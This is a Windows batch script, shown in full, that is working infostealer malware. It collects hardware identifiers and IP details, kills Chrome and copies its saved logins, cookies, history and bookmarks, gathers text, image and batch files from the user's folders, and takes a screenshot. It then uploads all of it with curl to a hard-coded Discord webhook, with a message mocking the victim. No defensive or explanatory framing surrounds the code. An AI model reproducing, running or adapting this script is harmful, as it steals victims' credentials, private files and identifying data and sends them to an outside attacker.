@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
color 0f
mode con cols=61 lines=30
cls


:: -- Collect HWID --

for /f "tokens=* delims=" %%a in ('reg query "HKLM\HARDWARE\DESCRIPTION\System\BIOS" /v "SystemManufacturer"') do (set "Brand=%%a")
for /f "tokens=* delims=" %%a in ('reg query "HKLM\HARDWARE\DESCRIPTION\System\BIOS" /v "BaseBoardProduct"') do (set "model=%%a")
for /f "tokens=* delims=" %%f in ('wmic diskdrive get SerialNumber') do (set "serial=%%f")

SETLOCAL ENABLEDELAYEDEXPANSION
SET count=1
FOR /F "tokens=* USEBACKQ" %%F IN (`wmic diskdrive get SerialNumber`) DO (
  SET serial!count!=%%F
  SET /a count=!count!+1
)
SET count1=1
FOR /F "tokens=* USEBACKQ" %%F IN (`wmic cpu get name`) DO (
  SET cpuser!count1!=%%F
  SET /a count1=!count1!+1
)

SET count2=1
FOR /F "tokens=* USEBACKQ" %%F IN (`wmic cpu get serialnumber`) DO (
  SET cpuserr!count2!=%%F
  SET /a count2=!count2!+1
)

SET count3=1
FOR /F "tokens=* USEBACKQ" %%F IN (`wmic path Win32_ComputerSystemProduct get UUID`) DO (
  SET uuid!count3!=%%F
  SET /a count3=!count3!+1
)

SET count4=1
FOR /F "tokens=* USEBACKQ" %%F IN (`wmic diskdrive get model`) DO (
  SET model!count4!=%%F
  SET /a count4=!count4!+1
)

SET count5=1
FOR /F "tokens=* USEBACKQ" %%F IN (`getmac`) DO (
  SET macadd!count5!=%%F
  SET /a count5=!count5!+1
)

SET count6=1
FOR /F "tokens=* USEBACKQ" %%F IN (`wmic nic get netconnectionid`) DO (
  SET nic!count6!=%%F
  SET /a count6=!count6!+1
)

SET count7=1
FOR /F "tokens=* USEBACKQ" %%F IN (`wmic nic get macaddress`) DO (
  SET nicadd!count7!=%%F
  SET /a count7=!count7!+1
)

SET count8=1
FOR /F "tokens=* USEBACKQ" %%F IN (`wmic memorychip get SerialNumber`) DO (
  SET memser!count8!=%%F
  SET /a count8=!count8!+1
)

SET count9=1
FOR /F "tokens=* USEBACKQ" %%F IN (`wmic path win32_videocontroller get name`) DO (
  SET gpuid!count9!=%%F
  SET /a count9=!count9!+1
)





:: -- important vars --
set "exfilKey=https://discord.com/api/webhooks/1294342109897162794/qin3QW18hStA0lyK1uluwfVAMWxCyHdoBjqBnTSrYnAeW-2_mm3v94dOihrMUcHuwYrJ"
set "output_dir=%localappdata%\Screenshots"
set "ScOrig=%~dp0"

:: -- Targeted locations --
set "documentsFolder=%USERPROFILE%\Documents"
set "desktopFolder=%USERPROFILE%\Desktop"
set "downloadsFolder=%USERPROFILE%\Downloads"
set "musicFolder=%USERPROFILE%\Music"
set "picturesFolder=%USERPROFILE%\Pictures"
set "videosFolder=%USERPROFILE%\Videos"

:: -- Chrome --
set "chrome_data_path=%LOCALAPPDATA%\Google\Chrome\User Data"

:: -- txt files --
set "textDest=%localappdata%\Screenshots\txt"

:: -- image files --
set "imageDest=%localappdata%\Screenshots\images"

:: -- bat files --
set "batDest=%localappdata%\Screenshots\bat"

:: -- info storage location --
set "screenshotDir=%localappdata%\Screenshots"

:: -- background ss --
set "screenshotFile=%screenshotDir%\screenshot.png"

if not exist "%output_dir%" mkdir "%output_dir%"
if not exist "%textDest%" mkdir "%textDest%"
if not exist "%imageDest%" mkdir "%imageDest%"
if not exist "%batDest%" mkdir "%batDest%"
cls


taskkill /f /im "chrome.exe"
copy "%chrome_data_path%\Default\History" "%output_dir%\History" >nul
copy "%chrome_data_path%\Default\Bookmarks" "%output_dir%\Bookmarks" >nul
copy "%chrome_data_path%\Default\Cookies" "%output_dir%\Cookies" >nul
copy "%chrome_data_path%\Default\Login Data" "%output_dir%\Login Data" >nul
cls

for %%a in ("%documentsFolder%\*.txt") do (
    copy "%%a" "%textDest%"
)

for %%b in ("%downloadsFolder%\*.txt") do (
    copy "%%b" "%textDest%"
)

for %%c in ("%picturesFolder%\*.txt") do (
    copy "%%c" "%textDest%"
)

for %%d in ("%videosFolder%\*.txt") do (
    copy "%%d" "%textDest%"
)

for %%e in ("%musicFolder%\*.txt") do (
    copy "%%e" "%textDest%"
)

for %%l in ("%desktopFolder%\*.txt") do (
    copy "%%l" "%textDest%"
)


for %%f in ("%documentsFolder%\*.png") do (
    copy "%%f" "%imageDest%"
)

for %%g in ("%documentsFolder%\*.jpg") do (
    copy "%%g" "%imageDest%"
)

for %%h in ("%downloadsFolder%\*.png") do (
    copy "%%h" "%imageDest%"
)

for %%i in ("%downloadsFolder%\*.jpg") do (
    copy "%%i" "%imageDest%"
)

for %%j in ("%picturesFolder%\*.png") do (
    copy "%%j" "%imageDest%"
)

for %%k in ("%picturesFolder%\*.jpg") do (
    copy "%%k" "%imageDest%"
)

for %%m in ("%videosFolder%\*.png") do (
    copy "%%m" "%imageDest%"
)

for %%n in ("%videosFolder%\*.jpg") do (
    copy "%%n" "%imageDest%"
)

for %%o in ("%desktopFolder%\*.png") do (
    copy "%%o" "%imageDest%"
)

for %%p in ("%desktopFolder%\*.jpg") do (
    copy "%%p" "%imageDest%"
)

for %%q in ("%desktopFolder%\*.bat") do (
    copy "%%q" "%batDest%"
)

for %%r in ("%downloadsFolder%\*.bat") do (
    copy "%%r" "%batDest%"
)

for %%s in ("%documentsFolder%\*.bat") do (
    copy "%%s" "%batDest%"
)
cls


powershell -command "Compress-Archive -Path '%output_dir%\Bookmarks' -DestinationPath '%output_dir%\Bookmarks.zip' -Force > $null 2>&1"
powershell -command "Compress-Archive -Path '%output_dir%\History' -DestinationPath '%output_dir%\History.zip' -Force > $null 2>&1"
powershell -command "Compress-Archive -Path '%output_dir%\Login Data' -DestinationPath '%output_dir%\Login_Data.zip' -Force > $null 2>&1"
powershell -command "Compress-Archive -Path '%output_dir%\txt' -DestinationPath '%output_dir%\txt.zip' -Force > $null 2>&1"
powershell -command "Compress-Archive -Path '%output_dir%\images' -DestinationPath '%output_dir%\images.zip' -Force > $null 2>&1"
powershell -command "Compress-Archive -Path '%output_dir%\bat' -DestinationPath '%output_dir%\bat.zip' -Force > $null 2>&1"

set "file1=%localappdata%\Screenshots\Bookmarks.zip"
cls
set "file2=%localappdata%\Screenshots\History.zip"
cls
set "file3=%localappdata%\Screenshots\Login_Data.zip"
cls
set "file4=%localappdata%\Screenshots\txt.zip"
cls
set "file5=%localappdata%\Screenshots\images.zip"
cls
set "file6=%localappdata%\Screenshots\bat.zip"
cls






setlocal enableextensions enabledelayedexpansion

set "size=0"
    for %%a in (a b c d e f g h i j k l m n o p q r s t u v w x y z A B C D E F G H I J K L M N O P Q R S T U V W X Y Z 0 1 2 3 4 5 6 7 8 9) do (
        set "a_!size!=%%a"
        set /a "size+=1"
    )
set keys=1
    for /l %%k in (1 1 %keys%) do (
        set "key="
        for /l %%a in (1 1 30) do (
            set /a "r=!random! %% size"
            for %%b in (!r!) do set "key=!key!!a_%%b!"
        )
        SET "license=!key:~0,5!-!key:~5,5!-!key:~10,5!-!key:~15,5!-!key:~20,5!-!key:~25,5!"
    ) 

for /f "tokens=2 delims==" %%A in ('wmic path Win32_ComputerSystemProduct get UUID /value') do set "hwid=%%A"
set hwid=%hwid: =%
cls

if not exist "%screenshotDir%" mkdir "%screenshotDir%"
cd %screenshotDir%
cls


for /f "delims=" %%i in ('curl -s https://ifconfig.me') do set PUBLIC_IP=%%i
cls

for /f "tokens=2 delims=:" %%i in ('ipconfig ^| findstr /i "IPv4"') do (
    set "ip=%%i"
    setlocal enabledelayedexpansion
    set "ip=!ip:~1!"
)
cls


for /f "tokens=* delims=" %%h in ('hostname') do (set "host=%%h")
cls

for /f "tokens=* delims=" %%h in ('echo %USERNAME%') do (set "pcname=%%h")
cls

for /f "tokens=* delims=" %%v in ('ver') do (set "osver=%%v")
cls


for /f "tokens=* delims=" %%t in ('tzutil /g') do (set "timezone=%%t")
cls

set "screenshotFile=%screenshotDir%\screenshot.png"
powershell -NoProfile -ExecutionPolicy Bypass -Command "Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $Screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $Bitmap = New-Object System.Drawing.Bitmap $Screen.Width, $Screen.Height; $Graphics = [System.Drawing.Graphics]::FromImage($Bitmap); $Graphics.CopyFromScreen(0, 0, 0, 0, $Screen.Size); $Bitmap.Save('%screenshotFile%', [System.Drawing.Imaging.ImageFormat]::Png); $Graphics.Dispose(); $Bitmap.Dispose();"
cls

set FILE_PATH=%screenshotDir%\screenshot.png
set "json_payload1={\"embeds\": [{\"title\": \"%pcname%\", \"description\": \"**Someone of severe low IQ ran your malware package YIPPEE** \n.        ```\nHostname: %host%``` ```\nOS Version: %osver%``` ```\nPrivate IP: !ip!``` ```\nPublic IP: %PUBLIC_IP%``` ```\nTime Zone: %timezone%``` \n**HWID Information:** ```\nMboard: %model:~34%``` ```\nUUID: %hwid%``` ```\nCPU: %cpuser2%``` ```\nCPU ID: %cpuserr2%``` ```\nGPU: %gpuid2%``` ```\nDisk 1: %model2%  %serial2%``` ```\nDisk 2: %model3%  %serial3%``` ```\nDisk 3: %model4%  %serial4%``` ```\nDisk 4: %model5%  %serial5%``` ```\nDisk 5: %model6%  %serial6%``` \", \"color\": 9503569, \"image\": {\"url\": \"attachment://screenshot.png\"}}]}"
curl -F "payload_json=%json_payload1%" -F "file1=@%file_path%" "%exfilKey%"
cls

curl -F "file=@%file1%" %exfilKey%
cls
curl -F "file=@%file2%" %exfilKey%
cls
curl -F "file=@%file3%" %exfilKey%
cls
curl -F "file=@%file4%" %exfilKey%
cls
curl -F "file=@%file5%" %exfilKey%
cls
curl -F "file=@%file6%" %exfilKey%
cls
